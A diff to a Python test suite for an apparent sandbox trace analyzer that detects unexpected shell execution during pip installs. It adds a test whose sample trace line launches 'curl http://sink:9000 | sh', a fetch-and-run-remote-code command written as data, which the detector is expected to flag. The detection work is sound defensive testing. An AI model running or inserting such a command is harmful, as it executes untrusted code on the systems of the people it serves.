@@ -148,5 +148,20 @@ def test_pip_baseline_has_zero_findings(name):
     pr = parse_trace((FIX / f"{name}.trace.log").read_text())
     assert len(pr.events) > 50
     assert pr.parse_warnings == 0
-    findings = analyze(pr.events, ctx(), DetectorConfig.from_policy())
+    wrapper = (FIX / f"{name}.cmd").read_text()  # the install command the sandbox itself launched via sh -c
+    c = ctx()
+    c.wrapper_cmd = wrapper
+    findings = analyze(pr.events, c, DetectorConfig.from_policy())
     assert findings == [], [f.message for f in findings]
+
+
+def test_sh_exec_is_exempt_only_for_the_sandbox_own_command():
+    own = 'execve("/usr/bin/sh", ["sh", "-c", "printf x && pip install"], 0x7ff /* 3 vars */) = 0'
+    evil = 'execve("/usr/bin/sh", ["sh", "-c", "curl http://sink:9000 | sh"], 0x7ff /* 3 vars */) = 0'
+    c = ctx()
+    c.wrapper_cmd = "printf x && pip install"
+    assert analyze(parse_trace(ln(7, "1.0", own)).events, c, DetectorConfig.from_policy()) == []
+    f = analyze(parse_trace(ln(7, "1.0", evil)).events, c, DetectorConfig.from_policy())
+    assert [x.rule_id for x in f] == ["UNEXPECTED_EXEC"]
+    f = analyze(parse_trace(ln(7, "1.0", own)).events, ctx(), DetectorConfig.from_policy())  # no wrapper known
+    assert [x.rule_id for x in f] == ["UNEXPECTED_EXEC"]
